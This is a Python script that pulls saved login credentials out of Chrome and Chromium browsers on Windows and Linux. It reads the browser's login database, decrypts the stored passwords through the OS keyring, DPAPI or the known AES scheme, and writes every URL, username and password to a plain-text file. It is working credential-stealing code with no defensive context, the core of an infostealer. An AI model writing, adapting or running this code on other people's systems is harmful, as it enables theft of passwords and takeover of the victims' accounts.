#! /usr/bin/env python

import secretstorage
import sqlite3
import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
try:
    import win32crypt
except:
    pass


class SavedBrowserPassword:
    def __init__(self):
        self.MY_PASS=""

    def linux_safe_storage(self):
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chromium Safe Storage':
                self.MY_PASS = item.get_secret()
                break
        else:
            raise Exception('Chromium password not found!')

    def fetch_data_windows(self):
        data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
        c = sqlite3.connect(data_path)
        cursor = c.cursor()
        select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)

        return cursor.fetchall()

    def fetch_data_linux(self):

        db = sqlite3.connect(os.getenv("HOME") + '/.config/chromium/Default/Login Data')

        cursor = db.cursor()
        cursor.execute('SELECT signon_realm, username_value, password_value FROM logins ')
        return cursor.fetchall()

    def decrypt_password(self,password):
        encrypted_value = password
        encrypted_value = encrypted_value[3:]
        salt = b'saltysalt'
        iv = b' ' * 16
        length = 16

        my_pass = self.MY_PASS
        iterations = 1

        key = PBKDF2(my_pass, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)

        decrypted = cipher.decrypt(encrypted_value)
        password = self.clean(decrypted)
        return password

    def clean(self,x):
        return x[:-x[-1]].decode('utf8')

    def get_saved_data_windows(self,login_data):
        saved_data=[]
        for url, username, password in login_data:
            password = win32crypt.CryptUnprotectData(password)
            password = password[1].decode()
            saved_data.append({"url": url, "username": username,"password":password})
        return saved_data

    def get_saved_data_linux(self, login_data):
        saved_data = []
        for url, username, password in login_data:
            password = self.decrypt_password(password)
            saved_data.append({"url": url, "username": username,"password":password})
        return saved_data


    def write_data_to_file(self,saved_data):

        with open("/home/vickyvirus/Documents/password.txt","w") as file:
            for data in saved_data:
                file.write("url :  " + data["url"])
                file.write("\nusername :  " + data["username"])
                file.write("\npassword : " + data["password"])


